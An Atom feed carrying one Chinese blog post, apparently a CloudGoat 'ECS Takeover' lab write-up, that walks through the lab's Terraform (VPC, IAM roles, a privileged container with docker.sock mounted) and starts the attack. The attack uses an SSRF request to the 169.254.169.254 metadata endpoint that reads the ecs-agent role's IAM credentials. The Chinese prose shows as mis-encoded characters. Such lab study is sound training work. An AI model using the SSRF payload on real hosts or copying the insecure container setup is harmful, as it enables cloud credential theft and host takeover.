<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://skyblu3519.github.io</id>
    <title>skkyblu3</title>
    <updated>2024-07-15T14:40:27.456Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://skyblu3519.github.io"/>
    <link rel="self" href="https://skyblu3519.github.io/atom.xml"/>
    <subtitle>Welcome to Internet</subtitle>
    <logo>https://skyblu3519.github.io/images/avatar.png</logo>
    <icon>https://skyblu3519.github.io/favicon.ico</icon>
    <rights>All rights reserved 2024, skkyblu3</rights>
    <entry>
        <title type="html"><![CDATA[[CloudGoat]ECS Takeover]]></title>
        <id>https://skyblu3519.github.io/post/cloudgoatecs-takeover/</id>
        <link href="https://skyblu3519.github.io/post/cloudgoatecs-takeover/">
        </link>
        <updated>2024-07-15T14:31:35.000Z</updated>
        <content type="html"><![CDATA[<h1 id="ecså¿«é€Ÿå…¥é—¨">ECSå¿«é€Ÿå…¥é—¨</h1>
<p>Amazon Elastic Container Service (Amazon ECS) æ˜¯AWSä¸Šçš„ä¸€ä¸ªå®¹å™¨ç¼–æ’æœåŠ¡ï¼Œå®ƒå’ŒK8sçš„åŒºåˆ«åœ¨äºECSæ˜¯Amazonè‡ªå·±å®ç°çš„å®¹å™¨ç¼–æ’æ–¹æ¡ˆï¼Œè€ŒK8sæ˜¯Googleçš„å¼€æºå®¹å™¨ç¼–æ’è§£å†³æ–¹æ¡ˆã€‚</p>
<p>é€šè¿‡ä¸‹é¢çš„å›¾å¿«é€Ÿäº†è§£ä¸‹ECSçš„å„ä¸ªç»„ä»¶<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720886254514-106f0f9a-96c6-469b-8e6b-7cbf1258cd8e.png" alt="image.png" loading="lazy"></p>
<ul>
<li>Cluster manager å¯ä»¥ç®¡ç†ä¸€ä¸ª Cluster ä¸Šçš„æ‰€æœ‰ Contaienr Instanceã€‚</li>
<li>Contaienr Instance æ˜¯ä¸€ä¸ª Linux ä¸»æœºï¼Œä¸Šé¢è¿è¡Œç€ Docker Engine å’Œ ECS Container Agentã€‚Contaienr Instance ä¼šå‘ Cluster manager æ³¨å†Œæ¥è®©å…¶å¯¹è‡ªå·±è¿›è¡Œç®¡ç†ã€‚</li>
<li>Service æ˜¯ä¸€ä¸ªä»»åŠ¡æ¸…å•ï¼ŒCluster manager ä¼šé€šè¿‡å„ç§æ–¹å¼åœ¨ Contaienr Instance ä¸Šå®ç°/ç»´æŒè¿™äº›ä»»åŠ¡ã€‚ä¸€ä¸ª Service ä¸­åŒ…å« Task Number å’Œ Task Definitionã€‚
<ul>
<li>Task Number æŒ‡çš„æ˜¯ Task çš„æ•°é‡ã€‚</li>
<li>Task Definition åˆ™æ˜¯ Task çš„å…·ä½“å†…å®¹ï¼Œå®ƒåŒ…æ‹¬ä¸€ä¸ª Container Definitionsã€‚Container Definitions åˆ™æ˜¯ä¸€ä¸ªé•œåƒå’Œé•œåƒçš„å¯åŠ¨å‘½ä»¤ã€‚</li>
</ul>
</li>
<li>Role ç®¡ç†ï¼Œåœ¨æ•´ä¸ª ECS ä¸­æ¶‰åŠ4ä¸ª Roleï¼Œå…¶ä¸­ Service RoleğŸ”µ å’Œ Task Execution RoleğŸŸ  å±äºåŠŸèƒ½ Role ç”¨æˆ·ä¸ç”¨å¤ªå…³å¿ƒã€‚å‰©ä¸‹ä¸¤ä¸ªï¼ŒTask RoleğŸŸ£ æ˜¯ä¸ºå…·ä½“æ‰§è¡Œä»»åŠ¡çš„ Container æä¾›çš„ Roleï¼Œå®ƒæ‰€æ¶‰åŠçš„äº‘èµ„æºçš„ä½¿ç”¨è¦ç”¨æˆ·æä¾›ï¼›ä¸€å° Contaienr Instance ä¸Šçš„ Container è¿˜å¯ä»¥ä½¿ç”¨è¿™å° Contaienr Instance RoleğŸ”´ çš„èµ„æºã€‚</li>
</ul>
<p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä¸Šé¢çš„ ECS æ˜¯ EC2 Modeã€‚é™¤æ­¤ä¹‹å¤– AWS è¿˜æä¾›äº†ä¸€ä¸ª Fargate çš„ ECSï¼Œåœ¨ Fargate ä¸­ Contaienr Instance åœ¨ç”¨æˆ·è§†è§’ä¸­å°†å®Œå…¨éšè—ï¼Œè¿™æ ·ç”¨æˆ·å°±å¯ä»¥æ›´ä¸“æ³¨äº Service çš„ç¼–å†™ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721052962707-ed760d33-d084-4e64-b930-b24cba9dadc8.png" alt="image.png" loading="lazy"></p>
<h1 id="tfä»£ç åˆ†æ">TFä»£ç åˆ†æ</h1>
<p>é™¤å»provider.tfã€outputs.tfã€variables.tfï¼Œå„ä¸ªèµ„æºéƒ½æ˜¯ç±»åˆ«åç§°å¯¹åº”è‡ªå·±çš„ tf æ–‡ä»¶<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720887770678-b7088e85-1469-4cac-88e5-2e7c4ece50b0.png" alt="image.png" loading="lazy"></p>
<h2 id="vpctf">vpc.tf</h2>
<p>åœ¨å°†ECSå¯åŠ¨å‰ï¼Œéœ€è¦æœ‰ä¸€ä¸ªæ‰¿è½½è¿™äº›èµ„æºçš„VPCã€‚ä»£ç é¦–å…ˆå®šä¹‰çš„ä¸€ä¸ªVPCçš„åŸºæœ¬å†…å®¹ï¼ŒåŒ…æ‹¬ä¸€ä¸ªVPCï¼ŒåŒæ—¶ä¸ºVPCæ·»åŠ ä¸€ä¸ªç½‘å…³å’Œä¸€ä¸ªå­ç½‘ã€‚</p>
<pre><code class="language-yaml">resource &quot;aws_vpc&quot; &quot;vpc&quot; {
  cidr_block           = &quot;10.0.0.0/16&quot;
  enable_dns_support   = true
  enable_dns_hostnames = true

  tags = {
    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-main&quot;
  }
}

resource &quot;aws_internet_gateway&quot; &quot;internet_gateway&quot; {
  vpc_id = aws_vpc.vpc.id

  tags = {
    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-main&quot;
  }
}

resource &quot;aws_subnet&quot; &quot;public&quot; {
  vpc_id            = aws_vpc.vpc.id
  availability_zone = &quot;us-east-1a&quot;
  cidr_block        = &quot;10.0.1.0/24&quot;

  tags = {
    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-public&quot;
  }
}
</code></pre>
<p>æ¥ç€åˆ›å»ºäº†æŒ‡å‘ç½‘å…³çš„é»˜è®¤è·¯ç”±ï¼ŒåŒæ—¶å°†è¯¥è·¯ç”±ä¸å­ç½‘å…³è”</p>
<pre><code class="language-yaml">resource &quot;aws_route_table&quot; &quot;public&quot; {
  vpc_id = aws_vpc.vpc.id

  route {
    cidr_block = &quot;0.0.0.0/0&quot;
    gateway_id = aws_internet_gateway.internet_gateway.id
  }

  tags = {
    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-public&quot;
  }
}

resource &quot;aws_route_table_association&quot; &quot;route_table_association&quot; {
  subnet_id      = aws_subnet.public.id
  route_table_id = aws_route_table.public.id
}
</code></pre>
<p>æœ€ååœ¨VPCä¸­å®šä¹‰äº†ä¸€ä¸ªå®‰å…¨ç»„å…è®¸ TCP æµé‡åˆ°ç«¯å£ 80 (HTTP) å’Œç«¯å£ 443 (HTTPS)ã€‚æº IP åœ°å€èŒƒå›´åˆ™æ ¹æ® <code>var.cg_whitelist</code> æ¥ç¡®å®šï¼Œè¿™ä¸ªå…¶å®å°±æ˜¯ CloudGoat é…ç½®æ—¶çš„ whitelist é€‰é¡¹ï¼ˆ0.0.0.0/0ï¼‰ã€‚</p>
<pre><code class="language-yaml">resource &quot;aws_security_group&quot; &quot;ecs_sg&quot; {
  vpc_id                 = aws_vpc.vpc.id
  revoke_rules_on_delete = true

  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = &quot;tcp&quot;
    cidr_blocks = var.cg_whitelist
  }

  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = &quot;tcp&quot;
    cidr_blocks = var.cg_whitelist
  }

  egress {
    from_port   = 0
    to_port     = 65535
    protocol    = &quot;tcp&quot;
    cidr_blocks = [&quot;0.0.0.0/0&quot;]
  }

  tags = {
    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-ecs-sg&quot;
  }
}
</code></pre>
<h2 id="iamtf">iam.tf</h2>
<p>iam.tfé‡Œé¢å®šä¹‰äº†ä¸¤ä¸ª IAM Roleï¼Œä¾› Contaienr Instance ä½¿ç”¨çš„ <code>ecs_agent</code> å’Œä¾› Task ä½¿ç”¨çš„ <code>privd</code></p>
<pre><code class="language-yaml">//
// ECS Worker Instance Role
//
data &quot;aws_iam_policy_document&quot; &quot;ecs_agent&quot; {
  statement {
    actions = [&quot;sts:AssumeRole&quot;]

    principals {
      type        = &quot;Service&quot;
      identifiers = [&quot;ec2.amazonaws.com&quot;]
    }
  }
}

resource &quot;aws_iam_role&quot; &quot;ecs_agent&quot; {
  name               = &quot;cg-${var.scenario-name}-${var.cgid}-ecs-agent&quot;
  assume_role_policy = data.aws_iam_policy_document.ecs_agent.json
}


resource &quot;aws_iam_role_policy_attachment&quot; &quot;ecs_agent&quot; {
  role       = aws_iam_role.ecs_agent.name
  policy_arn = &quot;arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role&quot;
}

resource &quot;aws_iam_instance_profile&quot; &quot;ecs_agent&quot; {
  name = &quot;cg-${var.scenario-name}-${var.cgid}-ecs-agent&quot;
  role = aws_iam_role.ecs_agent.name
}



//
//  ECS Container role
//

data &quot;aws_iam_policy_document&quot; &quot;ecs_tasks_role&quot; {
  statement {
    actions = [&quot;sts:AssumeRole&quot;]

    principals {
      type        = &quot;Service&quot;
      identifiers = [&quot;ecs-tasks.amazonaws.com&quot;]
    }
  }
}



resource &quot;aws_iam_role&quot; &quot;privd&quot; {
  name                = &quot;cg-${var.scenario-name}-${var.cgid}-privd&quot;
  assume_role_policy  = data.aws_iam_policy_document.ecs_tasks_role.json
  managed_policy_arns = [aws_iam_policy.privd.arn]
}

// Give the role read access to ecs and IAM permissions.
resource &quot;aws_iam_policy&quot; &quot;privd&quot; {
  name = &quot;cg-${var.scenario-name}-${var.cgid}-privd&quot;

  policy = jsonencode({
    Version = &quot;2012-10-17&quot;
    Statement = [
      {
        Action = [
          &quot;ecs:ListServices&quot;,
          &quot;ecs:ListTasks&quot;,
          &quot;ecs:DescribeServices&quot;,
          &quot;ecs:ListContainerInstances&quot;,
          &quot;ecs:DescribeContainerInstances&quot;,
          &quot;ecs:DescribeTasks&quot;,
          &quot;ecs:ListTaskDefinitions&quot;,
          &quot;ecs:DescribeClusters&quot;,
          &quot;ecs:ListClusters&quot;,
          &quot;iam:GetPolicyVersion&quot;,
          &quot;iam:GetPolicy&quot;,
          &quot;iam:ListAttachedRolePolicies&quot;,
          &quot;iam:GetRolePolicy&quot;
        ]
        Effect   = &quot;Allow&quot;
        Resource = &quot;*&quot;
      },
    ]
  })
}
</code></pre>
<p>å…¶ä¸­<code>ecs_agent</code>ç›´æ¥ä½¿ç”¨çš„AWSæ‰˜ç®¡ç­–ç•¥<code>AmazonEC2ContainerServiceforEC2Role</code>ã€‚æ ¹æ®å¯¹è¯¥ç­–ç•¥çš„æè¿°ï¼Œè¿™æ˜¯ä¸€ä¸ªECSä¸­EC2çš„é»˜è®¤ç­–ç•¥ã€‚å…¶ä¸­åŒ…æ‹¬å¯¹ CloudWatch Logsã€EC2ã€Elastic Container Registryã€Elastic Container Service çš„æœ‰é™è®¿é—®ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720890039990-0cd1019a-7de0-4a9a-8b72-8f2c9e3490fb.png" alt="image.png" loading="lazy"></p>
<p>è€Œ<code>privd</code>ç­–ç•¥æ¶‰åŠå¯¹ AWS ECS å’Œ IAM æœåŠ¡çš„æŸ¥è¯¢å’Œè·å–ä¿¡æ¯çš„æ“ä½œã€‚</p>
<pre><code class="language-yaml">{
  Action = [
    &quot;ecs:ListServices&quot;,
    &quot;ecs:ListTasks&quot;,
    &quot;ecs:DescribeServices&quot;,
    &quot;ecs:ListContainerInstances&quot;,
    &quot;ecs:DescribeContainerInstances&quot;,
    &quot;ecs:DescribeTasks&quot;,
    &quot;ecs:ListTaskDefinitions&quot;,
    &quot;ecs:DescribeClusters&quot;,
    &quot;ecs:ListClusters&quot;,
    &quot;iam:GetPolicyVersion&quot;,
    &quot;iam:GetPolicy&quot;,
    &quot;iam:ListAttachedRolePolicies&quot;,
    &quot;iam:GetRolePolicy&quot;
  ]
  Effect   = &quot;Allow&quot;
  Resource = &quot;*&quot;
}
</code></pre>
<h2 id="ec2tf">ec2.tf</h2>
<p>ec2.tfä¸»è¦å®šä¹‰äº†ä¸¤ä¸ª EC2 å®ä¾‹ã€‚å…¶ä¸­å®ƒä»¬ä½¿ç”¨äº† AWS å®˜æ–¹ä¸º ECS æœåŠ¡å®šåˆ¶çš„ AMI</p>
<pre><code class="language-yaml">data &quot;aws_ami&quot; &quot;ecs&quot; {
  most_recent = true
  owners      = [&quot;amazon&quot;]

  filter {
    name   = &quot;name&quot;
    values = [&quot;amzn2-ami-ecs-hvm-*&quot;]
  }

  filter {
    name   = &quot;virtualization-type&quot;
    values = [&quot;hvm&quot;]
  }

  filter {
    name   = &quot;architecture&quot;
    values = [&quot;x86_64&quot;]
  }
}
</code></pre>
<p>ä¸‹é¢è¿™æ®µ<code>user_data</code>æ˜¯è®© EC2 å®ä¾‹å¯åŠ¨çš„æ—¶å€™æ‰§è¡Œå‘½ä»¤<code>echo ECS_CLUSTER=${aws_ecs_cluster.ecs_cluster.name} &gt;&gt; /etc/ecs/ecs.config</code>æ¥è‡ªåŠ¨åŠ å…¥ cluster</p>
<pre><code class="language-yaml">locals {
  user_data = &lt;&lt;EOH
#!/bin/bash
echo ECS_CLUSTER=${aws_ecs_cluster.ecs_cluster.name} &gt;&gt; /etc/ecs/ecs.config
EOH
}
</code></pre>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰å…³è”çš„è§’è‰²å’Œå®‰å…¨ç»„çš„é…ç½®ï¼Œå‡æ˜¯å‰é¢é…ç½®å¥½çš„ã€‚åŒæ—¶è¿™ä¸¤ä¸ª EC2 éƒ½å…³è”äº†å…¬ç½‘ IP <code>associate_public_ip_address = true</code></p>
<pre><code class="language-yaml">resource &quot;aws_instance&quot; &quot;vulnsite&quot; {
  ami                         = data.aws_ami.ecs.id
  iam_instance_profile        = aws_iam_instance_profile.ecs_agent.name
  vpc_security_group_ids      = [aws_security_group.ecs_sg.id]
  user_data                   = local.user_data
  instance_type               = &quot;t2.micro&quot;
  associate_public_ip_address = true
  subnet_id                   = aws_subnet.public.id

  tags = {
    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-vulnsite&quot;
  }
}

resource &quot;aws_instance&quot; &quot;vault&quot; {
  ami                         = data.aws_ami.ecs.id
  iam_instance_profile        = aws_iam_instance_profile.ecs_agent.name
  vpc_security_group_ids      = [aws_security_group.ecs_sg.id]
  user_data                   = local.user_data
  instance_type               = &quot;t2.micro&quot;
  associate_public_ip_address = true
  subnet_id                   = aws_subnet.public.id

  tags = {
    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-vault&quot;
  }
}
</code></pre>
<h2 id="ecstf">ecs.tf</h2>
<p>ecs.tfå¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š</p>
<ul>
<li>å®šä¹‰ Cluster</li>
<li>å®šä¹‰ Task Definition</li>
<li>å®šä¹‰ Service</li>
</ul>
<p>å®šä¹‰ Cluster æ¯”è¾ƒç®€å•åªåŒ…å«ä¸€ä¸ª name å‚æ•°</p>
<pre><code class="language-yaml">resource &quot;aws_ecs_cluster&quot; &quot;ecs_cluster&quot; {
  name = &quot;${var.scenario-name}-${var.cgid}-cluster&quot;
}
</code></pre>
<p>ç„¶åæ˜¯ä¸‰ä¸ª Task Definition çš„å®šä¹‰ï¼Œè¿™é‡Œçœ‹ä¸‹æœ€åä¸€ä¸ª<code>vulnsite</code></p>
<ul>
<li>ä»»åŠ¡å®šä¹‰åŸºæœ¬é…ç½®
<ul>
<li><code>family</code>: ä»»åŠ¡å®šä¹‰çš„å®¶æ—åï¼Œè¿™é‡Œä½¿ç”¨ Terraform å˜é‡ <code>var.scenario-name</code> å’Œ <code>var.cgid</code> åŠ¨æ€ç”Ÿæˆã€‚å·®ä¸å¤šå°±æ˜¯ä¸€ä¸ªåç§°ã€‚</li>
<li><code>network_mode</code>: è®¾ç½®ä¸º <code>&quot;host&quot;</code>ï¼Œè¡¨æ˜ä»»åŠ¡å°†ä½¿ç”¨å®¿ä¸»æœºçš„ç½‘ç»œå‘½åç©ºé—´ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œå®¹å™¨å°†ç›´æ¥ä½¿ç”¨å®¿ä¸»æœºçš„ç½‘ç»œï¼Œä¸ä¼šè™šæ‹ŸåŒ–æˆ–éš”ç¦»ç½‘ç»œã€‚</li>
</ul>
</li>
<li>å®¹å™¨å®šä¹‰
<ul>
<li><code>name</code>: å®¹å™¨çš„åç§°ï¼Œè®¾ä¸º <code>&quot;vulnsite&quot;</code>ã€‚</li>
<li><code>image</code>: å®¹å™¨ä½¿ç”¨çš„é•œåƒï¼Œè¿™é‡Œæ˜¯ <code>&quot;cloudgoat/ecs-takeover-vulnsite:latest&quot;</code>ï¼Œè¡¨ç¤ºä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„ cloudgoat/ecs-takeover-vulnsite é•œåƒã€‚</li>
<li><code>essential</code>: è®¾ç½®ä¸º <code>true</code>ï¼Œè¡¨ç¤ºè¿™ä¸ªå®¹å™¨å¿…é¡»åœ¨è¿è¡Œæ—¶å§‹ç»ˆå¤„äºè¿è¡ŒçŠ¶æ€ï¼›å¦‚æœå®ƒå¤±è´¥ï¼ŒECS å°†åœæ­¢æ•´ä¸ªä»»åŠ¡ã€‚</li>
<li><code>privileged</code>: è®¾ç½®ä¸º <code>true</code>ï¼Œèµ‹äºˆå®¹å™¨æå‡çš„æƒé™ï¼Œå…è®¸å®ƒè®¿é—®å®¿ä¸»æœºçš„èµ„æºï¼Œè¿™åœ¨éœ€è¦æ‰§è¡Œç‰¹å®šç³»ç»Ÿæ“ä½œçš„æƒ…å†µä¸‹æ˜¯å¿…éœ€çš„ã€‚</li>
<li><code>network_mode</code>: æŒ‡å®šäº† <code>&quot;awsvpc&quot;</code>ã€‚æ ¹æ®è¿‡å¾€æ–‡æ¡£çš„æè¿°<code>awsvpc</code>ç½‘ç»œæ¨¡å¼æä¾›çš„ä»»åŠ¡è”ç½‘åŠŸèƒ½ä½¿ Amazon ECS ä»»åŠ¡å…·æœ‰ä¸ Amazon EC2 å®ä¾‹ç›¸åŒçš„è”ç½‘å±æ€§ã€‚æ„Ÿè§‰å’Œå‰é¢çš„<code>network_mode: &quot;host&quot;</code>æœ‰ç‚¹ç›¸ä¼¼ï¼Œä¸çŸ¥é“æ˜¯é…åˆä½¿ç”¨è¿˜æ˜¯å†²çªè®¾ç½®ã€‚</li>
<li><code>cpu</code> å’Œ <code>memory</code>: åˆ†åˆ«è®¾ç½®å®¹å™¨çš„ CPU å’Œå†…å­˜é™åˆ¶ï¼Œè¿™é‡Œæ˜¯ 256 CPU å•ä½å’Œ 256 MB å†…å­˜ã€‚</li>
<li><code>portMappings</code>: å®šä¹‰ç«¯å£æ˜ å°„ï¼Œè¿™é‡Œå°†å®¹å™¨çš„ 80 ç«¯å£æ˜ å°„åˆ°å®¿ä¸»æœºçš„ 80 ç«¯å£ï¼Œä½¿å®¹å™¨å¯ä»¥å¤„ç† HTTP æµé‡ã€‚</li>
<li><code>mountPoints</code>: å®šä¹‰æŒ‚è½½ç‚¹ï¼Œå’Œåé¢çš„<code>volume</code>é€‰é¡¹é…åˆï¼Œé‡Œå°†å®¿ä¸»æœºçš„ <code>/var/run/docker.sock</code> æŒ‚è½½åˆ°å®¹å™¨çš„ç›¸åŒè·¯å¾„ä¸Šã€‚è¿™é€šå¸¸ç”¨äºå…è®¸å®¹å™¨å†…çš„åº”ç”¨ç®¡ç†å®¿ä¸»æœºä¸Šçš„ Docker å®ˆæŠ¤è¿›ç¨‹ã€‚</li>
</ul>
</li>
<li>å·å®šä¹‰
<ul>
<li><code>name</code>: å·çš„åç§° <code>&quot;docker-socket&quot;</code>ã€‚</li>
<li><code>host_path</code>: å®šä¹‰å®¿ä¸»æœºä¸Šçš„è·¯å¾„ <code>/var/run/docker.sock</code>ã€‚è¿™å…è®¸å®¹å™¨é€šè¿‡ Docker å¥—æ¥å­—ä¸å®¿ä¸»æœºçš„ Docker å®ˆæŠ¤è¿›ç¨‹äº¤äº’ã€‚</li>
</ul>
</li>
</ul>
<p>ç‰¹æƒæ¨¡å¼+<code>/var/run/docker.sock</code>æŒ‚è½½ï¼Œè¿™ä¸ªå®¹å™¨çš„å±é™©æ€§å·²ä¸è¨€è€Œå–»ã€‚</p>
<pre><code class="language-yaml">resource &quot;aws_ecs_task_definition&quot; &quot;vault&quot; {
  family = &quot;cg-${var.scenario-name}-${var.cgid}-vault&quot;

  # Wait for the website to be deployed to the cluster.
  # This should make sure the instances are available.
  container_definitions = jsonencode([
    {
      name      = &quot;vault&quot;
      image     = &quot;busybox:latest&quot;
      essential = true
      cpu       = 50
      memory    = 50
      command   = [&quot;/bin/sh -c \&quot;echo '{{FLAG_1234677}}' &gt;  /FLAG.TXT; sleep 365d\&quot;&quot;]
      entryPoint = [
        &quot;sh&quot;,
        &quot;-c&quot;
      ]
    }
  ])
}

// Hosts the role we want to use to force rescheduling
resource &quot;aws_ecs_task_definition&quot; &quot;privd&quot; {
  family        = &quot;cg-${var.scenario-name}-${var.cgid}-privd&quot;
  task_role_arn = aws_iam_role.privd.arn
  container_definitions = jsonencode([
    {
      name      = &quot;privd&quot;
      image     = &quot;busybox:latest&quot;
      cpu       = 50
      memory    = 50
      essential = true
      command   = [&quot;sleep&quot;, &quot;365d&quot;]
    }
  ])
}

// Hosts website to container escape execution
resource &quot;aws_ecs_task_definition&quot; &quot;vulnsite&quot; {
  family       = &quot;cg-${var.scenario-name}-${var.cgid}-vulnsite&quot;
  network_mode = &quot;host&quot;
  container_definitions = jsonencode([
    {
      name         = &quot;vulnsite&quot;
      image        = &quot;cloudgoat/ecs-takeover-vulnsite:latest&quot;
      essential    = true
      privileged   = true
      network_mode = &quot;awsvpc&quot;
      cpu          = 256
      memory       = 256
      portMappings = [
        {
          containerPort = 80
          hostPort      = 80
        }
      ]
      mountPoints = [
        {
          readOnly      = false,
          containerPath = &quot;/var/run/docker.sock&quot;
          sourceVolume  = &quot;docker-socket&quot;
        }
      ]
    }
  ])

  volume {
    name      = &quot;docker-socket&quot;
    host_path = &quot;/var/run/docker.sock&quot;
  }
}
</code></pre>
<p>æœ€åæ˜¯ä¸‰ä¸ª Service çš„å®šä¹‰ã€‚<code>vulnsite</code>é€šè¿‡<code>memberOf</code>ç±»å‹çš„çº¦æŸï¼Œè®©ä»»åŠ¡çš„éƒ¨ç½²å¿…é¡»æ»¡è¶³è¡¨è¾¾å¼<code>ec2InstanceId == ${aws_instance.vulnsite.id}</code>ï¼Œä¹Ÿå°±æ˜¯æŒ‡å®šäº† EC2 å®ä¾‹ IDã€‚</p>
<pre><code class="language-yaml">resource &quot;aws_ecs_service&quot; &quot;vulnsite&quot; {
  name            = &quot;vulnsite&quot;
  cluster         = aws_ecs_cluster.ecs_cluster.id
  task_definition = aws_ecs_task_definition.vulnsite.arn
  desired_count   = 1

  placement_constraints {
    type       = &quot;memberOf&quot;
    expression = &quot;ec2InstanceId == ${aws_instance.vulnsite.id}&quot;
  }
}
</code></pre>
<p>é¢„ç½®å™¨(Provisioner)æ˜¯ç”± Terraform æ‰€æä¾›çš„å¦ä¸€ç»„æ’ä»¶ï¼Œæ¯ç§é¢„ç½®å™¨å¯ä»¥åœ¨èµ„æºå¯¹è±¡åˆ›å»ºåæ‰§è¡Œä¸åŒç±»å‹çš„æ“ä½œã€‚<code>vault</code>ä¸­çš„<code>Provisioner</code>è¡¨ç¤ºåœ¨åˆ›å»ºèµ„æºåæ‰§è¡Œä¸€ä¸ªPythonè„šæœ¬<code>remove_placement_constraints.py</code>ï¼ŒåŒæ—¶é…ç½®äº†æ‰§è¡Œè¿™ä¸ªè„šæœ¬çš„ç¯å¢ƒå˜é‡ã€‚</p>
<pre><code class="language-yaml">resource &quot;aws_ecs_service&quot; &quot;vault&quot; {
  name                 = &quot;vault&quot;
  cluster              = aws_ecs_cluster.ecs_cluster.id
  task_definition      = aws_ecs_task_definition.vault.arn
  force_new_deployment = true
  desired_count        = 1


  depends_on = [
    aws_ecs_service.vulnsite,
  ]

  ordered_placement_strategy {
    type = &quot;random&quot;
  }

  // Setting this here ensures vault start's on the right instance, this setting is removed in the provisioner below.
  placement_constraints {
    type       = &quot;memberOf&quot;
    expression = &quot;ec2InstanceId == ${aws_instance.vault.id}&quot;
  }

  provisioner &quot;local-exec&quot; {
    command = &quot;/usr/bin/env python3 remove_placement_constraints.py&quot;
    environment = {
      CLUSTER            = self.cluster
      SERVICE_NAME       = self.name
      AWS_DEFAULT_REGION = var.region
      AWS_PROFILE        = var.profile
    }
  }
}

</code></pre>
<p><code>remove_placement_constraints.py</code>è„šæœ¬åˆ™æ˜¯åœ¨vaultæœåŠ¡å¯åŠ¨åç§»é™¤æœåŠ¡çš„æ”¾ç½®é™åˆ¶</p>
<pre><code class="language-python">&quot;&quot;&quot;Removes the PlacmentConstraints set for a given cluster/service.&quot;&quot;&quot;
import boto3
import time
from os import environ

ecs = boto3.client('ecs', region_name='us-east-1')

cluster = environ['CLUSTER']
service_name = environ['SERVICE_NAME']

while True:
    resp = ecs.list_tasks(
        cluster=cluster,
        serviceName=service_name,
        desiredStatus=&quot;RUNNING&quot;,
    )
    if len(resp['taskArns']) &gt; 0:
        break

    print(f&quot;Waiting for tasks in the service {service_name} to enter the the RUNNING state.&quot;)
    time.sleep(5)

ecs.update_service(
    cluster=cluster,
    service=service_name,
    placementConstraints=[],
)
</code></pre>
<h2 id="outputstf">outputs.tf</h2>
<p>æœ€åçš„<code>outputs.tf</code>å°†å®ä¾‹çš„<code>public_dns</code>å±æ€§è¾“å‡ºï¼Œè¿™æ˜¯AWS ä¸ºæ¯ä¸ªå…·æœ‰å…¬ç½‘ IP çš„ EC2 å®ä¾‹è‡ªåŠ¨åˆ†é…ä¸€ä¸ªå…¬å…± DNS åç§°ã€‚</p>
<pre><code class="language-yaml">output &quot;vuln-site&quot; {
  value = aws_instance.vulnsite.public_dns
}
</code></pre>
<p>å…³äºDNSè§£æçš„é…ç½®æœ‰ä¸¤ä¸ªéƒ¨åˆ†ï¼Œé¦–å…ˆæ˜¯å®ä¾‹ä¸­é…ç½®äº†å…³è”å…¬ç½‘IP</p>
<pre><code class="language-yaml">resource &quot;aws_instance&quot; &quot;vulnsite&quot; {
  ...
  associate_public_ip_address = true
  ...
}
</code></pre>
<p>æ­¤å¤–ï¼ŒAWS VPC ä¸­æœ‰ä¸¤ä¸ªç›¸å…³çš„ DNS è®¾ç½®ï¼š<code>enable_dns_support</code> å’Œ <code>enable_dns_hostnames</code>ã€‚<code>enable_dns_support</code> æ§åˆ¶ VPC æ˜¯å¦ä½¿ç”¨ Amazon-provided DNS æœåŠ¡å™¨è§£æ DNS æŸ¥è¯¢ï¼Œè€Œ <code>enable_dns_hostnames</code> æ§åˆ¶æ˜¯å¦è‡ªåŠ¨ä¸º VPC ä¸­çš„å®ä¾‹åˆ†é… DNS ä¸»æœºåã€‚</p>
<pre><code class="language-yaml">resource &quot;aws_vpc&quot; &quot;example&quot; {
  ...
  enable_dns_support   = true
  enable_dns_hostnames = true
  ...
}
</code></pre>
<h1 id="scenario-ecs_takeover">Scenario: ecs_takeover</h1>
<h2 id="èƒŒæ™¯">èƒŒæ™¯</h2>
<p>Scenario Resources</p>
<ul>
<li>1 VPC and Subnet with:</li>
<li>2 EC2 Instances</li>
<li>1 ECS Cluster</li>
<li>3 ECS Services</li>
<li>1 Internet Gateway</li>
</ul>
<p>Scenario Start(s)</p>
<ul>
<li>Access the external website via the EC2 Instance's public IP.</li>
</ul>
<p>Scenario Goal(s)</p>
<ul>
<li>Gain access to the &quot;vault&quot; container and retrieve the flag.</li>
</ul>
<h2 id="æ¸—é€æµç¨‹">æ¸—é€æµç¨‹</h2>
<p>è®¿é—®èµ·å§‹çš„URLï¼Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªSSRFæ¼æ´<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720954153030-b697fca4-2527-4a8b-9297-f26b0f45423a.png" alt="image.png" loading="lazy"></p>
<p>è·å–å…³è”è§’è‰²<code>?url=169.254.169.254/latest/meta-data/iam/security-credentials/cg-ecs-takeover-ecs_takeover_cgid1cex40y24h-ecs-agent/</code><br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720954269075-742cc574-4b57-4e91-9fc0-07a7f91b202a.png" alt="image.png" loading="lazy"></p>
<p>ç™»å½•çš„è§’è‰²æ˜¯<code>ecs-agent</code>ï¼Œå‰é¢æˆ‘ä»¬çŸ¥é“äº†è¿™ä¸ªè§’è‰²çš„ç­–ç•¥æ˜¯<code>AmazonEC2ContainerServiceforEC2Role</code><br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720954606056-80352c0b-1fd5-4526-96b7-8679ed81ffa4.png" alt="image.png" loading="lazy"></p>
